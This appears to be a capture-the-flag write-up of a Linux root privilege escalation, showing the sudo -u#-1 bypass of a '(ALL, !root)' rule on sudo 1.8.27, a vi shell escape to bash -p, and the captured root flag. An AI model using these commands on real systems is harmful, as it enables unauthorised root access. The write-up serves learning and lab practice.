# Le Bananier des Montagnes — Part 2 — `root.txt`

## Objective

Obtain the root flag:

```text
/root/root.txt
```

Starting point:

```text
User: gabriel
```



## 1. Privilege Enumeration

The first step was to inspect Gabriel's current privileges:

```bash
whoami
id
sudo -l
```

Result:

```text
gabriel
uid=1000(gabriel) gid=1000(gabriel) groups=1000(gabriel)

User gabriel may run the following commands on le_bananier_des_montagnes:
    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gabriel/user.txt
```

This sudo rule allows Gabriel to execute:

```text
/usr/bin/vi /home/gabriel/user.txt
```

as any user except `root`, without a password.

The home directory also contained:

```text
note.txt
```

Its content was:

```text
I haven't find a way to update that specific package...
Oh well, old is retro right? And retro is hype, right?
```

This strongly suggested that an outdated package was involved in the privilege escalation.



## 2. Checking the Sudo Version

The sudo version was checked with:

```bash
sudo --version | head -n 1
```

Result:

```text
Sudo version 1.8.27
```

This version is old and vulnerable to the `sudo -u#-1` bypass affecting sudo versions before `1.8.28`.

The vulnerable behavior is relevant when a sudoers rule allows execution as every user except root:

```text
(ALL, !root)
```



## 3. Bypassing the `!root` Restriction

The vulnerable sudo version incorrectly handles the special UID:

```text
-1
```

The following command was used:

```bash
sudo -u#-1 /usr/bin/vi /home/gabriel/user.txt
```

The intention is to request execution with UID `-1`.

Due to the vulnerable sudo implementation, this results in the process effectively running with:

```text
UID 0
```

which corresponds to `root`.



## 4. Obtaining a Root Shell Through `vi`

Because `vi` can execute operating-system commands, it can be used to spawn a shell.

Inside `vi`, the following command was executed:

```vim
:!/bin/bash -p
```

The `-p` option preserves the effective privileged identity.

A shell was obtained and verified with:

```bash
id
whoami
```

Result:

```text
uid=0(root) gid=1000(gabriel) groups=1000(gabriel)
root
```

The privilege escalation was therefore successful.



## 5. Root Flag

The root flag was retrieved with:

```bash
cat /root/root.txt
```

Result:

```text
EPI{L4_t193_Fl0R1F3R3_D35_m0nt49N35_DR35533}
```



## Attack Path

```text
gabriel
  ↓
sudo -l
  ↓
(ALL, !root) NOPASSWD: vi
  ↓
note.txt hints at an outdated package
  ↓
sudo 1.8.27 identified
  ↓
sudo -u#-1 bypass
  ↓
vi executed with UID 0
  ↓
:!/bin/bash -p
  ↓
Root shell
  ↓
/root/root.txt
```

## Vulnerability Summary

The privilege escalation relied on two conditions:

1. A sudoers rule allowing Gabriel to execute `vi` as every user except root:

```text
(ALL, !root)
```

2. An outdated sudo version:

```text
1.8.27
```

Older sudo versions incorrectly handled the user specification:

```text
-u#-1
```

This allowed the `!root` restriction to be bypassed and `vi` to execute with UID `0`.

Because `vi` can execute shell commands, it was then used to obtain a root shell.



## Skills Demonstrated

- Linux local privilege enumeration
- `sudo -l` analysis
- Sudoers rule interpretation
- Vulnerable package/version identification
- Sudo UID bypass exploitation
- Living-off-the-land abuse of `vi`
- Root shell acquisition
- Root flag retrieval
